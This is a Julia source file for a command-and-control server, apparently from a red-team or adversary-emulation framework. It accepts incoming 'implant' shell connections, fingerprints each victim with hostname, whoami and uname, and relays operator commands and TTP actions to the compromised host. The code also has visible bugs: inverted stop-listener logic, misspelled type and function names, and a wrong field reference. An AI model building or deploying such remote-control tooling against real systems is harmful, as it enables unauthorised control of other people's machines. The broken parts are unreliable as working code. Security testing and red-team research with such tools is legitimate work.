using UUIDs
using Sockets


Base.@kwdef struct Session <: AbstractSession 
    id::AbstractString = string(uuid4())
    commands::Channel = Channel{String}(32)
    results::Channel = Channel{Tuple{String, String}}(32)
end

Base.@kwdef mutable struct C2
    listeners::Dict{AbstractString, Task} = Dict()
    sessions::Dict{AbstractString, Session} = Dict()
end


function sendCommand(conn, cmd::String)
    @debug " 📥 sending '$cmd'"
    write(conn, "$cmd\n")
    # response = readline(conn) # works only for single line responses
    # this is considered bad practice, maybe find a better alternative 
    # that can read all available bytes (also multiline responses)
    bytes = readavailable(conn)
    response = strip(join(map(Char, bytes)))
    @debug "Got '$response'"
    return response
end

function handleNewImplant(conn, bus :: MessageBus, listenerId::String,  c2::C2)
    session = Session()
    c2.sessions[session.id] = session

    hostname = sendCommand(conn, "hostname")
    user = sendCommand(conn, "whoami")
    os = inferOS(sendCommand(conn, "uname"))

    publish!(bus, SessionStarted(id=session.id, listenerId=listenerId, hostname=hostname, user=user, os=os))
    # active lifetime of the implant
    # TODO: handle external session disconnect
        # maybe send periodic pings to session, if it's a simple shell?
    for cmd in session.commands
        # println(" >>>> 🫡 Command: $cmd")
        res = sendCommand(conn, cmd)
        put!(session.results, (cmd, res))
    end

    # cleanup after the session ended
    println("done with implant $session.id")
    publish!(bus, SessionEnded(session.id))
end

function inferOS(os::AbstractString) :: AbstractString
    os = lowercase(os)
    if contains(os, "darwin")
        return "macOS"
    elseif contains(os, "linux")
        return "Linux"
    elseif contains(os, "win")
        return "Windows"
    end
    return "Unknown"
end


function startListener(ev::StartListener, bus:: MessageBus, c2::C2)
    listenerId = string(uuid4())
    @info "Start C2 listener ($listenerId) on port $(ev.port)"

    # HTTP.serve!(handleNewImplant, "0.0.0.0",ev.port; async=true)
    listenerTask = errormonitor(@async begin
        server = Sockets.listen(ip"0.0.0.0", ev.port)
        while true # TODO maybe create Event to stop  here and return the event as result event from this fn, so the event can be set somewhere else
            sock = Sockets.accept(server)
            errormonitor(@async handleNewImplant(sock, bus, listenerId, c2))
        end
        @warn "Listener stopped"
    end)

    c2.listeners[listenerId] = listenerTask
    return ListenerReady(listenerId, ev.port, "tcp", listenerTask)
end

function onStopListener(ev::StopListener, channel:: Channel, c2::C2)
    listener = get(c2.listeners, ev.listenerId, nothing)
    if isnothing(listener)
        # TODO stop listener
        close(listener)
        return ListenerStopped(ev.listenerId)
    end
    @error "Could not find listener with id $(ev.listenerId) to stop"
    # return ListenerStopped(ev.listenerId)
end



function onSessionEnded(ev::SessionEnded, c2::C2)
    delete!(c2.sessions, ev.sessionId)
end


function executeActionOnTarget(ev::ExecuteActionOnTarget, c2::C2)
    session = get(c2.sessions, ev.target, nothing)
    if isnothing(session)
        @error "Could not find target with id $(ev.target)"
        return
    end
    # TODO implement error handling if command is not possible
    # TODO get the TTP from the armory
    # TODO attempt dependency injection for the various TTPs depending on their signature

    if typeof(ev.ttp.action) <: Function
        println("Signature of function: ")
        println(methods(ev.ttp.action))
        result = ev.ttp.action(session, ev.target)
    elseif typeof(ev.ttp.action) <: AbsrtactString
        put!(session.commands, ev.action)
        executedAction, result = take!(session.results)
    else
        @error "Action type not supported"
    end


    if isa(result, Event)
        # return result as a dedicated event to be sent to the bus, instead of the wrapper Event
        return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id), result
    else
        return ActionExecuted(sessionId=session.id, actionId=ev.ttp.id, output=result)
    end 

end



function startC2(bus:: MessageBus)
    # start out with one listener out of the box

    c2 = C2()
    ev = startListener(StartListener(), bus, c2)
    publish!(bus, ev)

    register!(bus, StartListener, (ev) -> startListener(ev, bus, c2))
    register!(bus, StopListener, (ev) -> onStoptListener(ev, bus, c2))
    register!(bus, ExecuteActionOnTarget, (ev) -> executeActionOnTarget(ev, c2))

    register!(bus, SessionEnded, (ev) -> onSessionEnded(ev, c2))
end 